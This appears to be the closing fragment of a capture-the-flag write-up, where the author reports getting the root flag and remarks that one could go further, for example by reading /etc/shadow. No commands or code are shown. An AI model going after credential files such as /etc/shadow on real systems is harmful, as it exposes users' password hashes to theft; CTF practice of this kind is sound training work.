[SYSTEM] 5db2b41afad7aaa51848fcc4deea352a
```
Well we got rootflag, you could probably do more like getting /etc/shadow or something. But flag is flag!
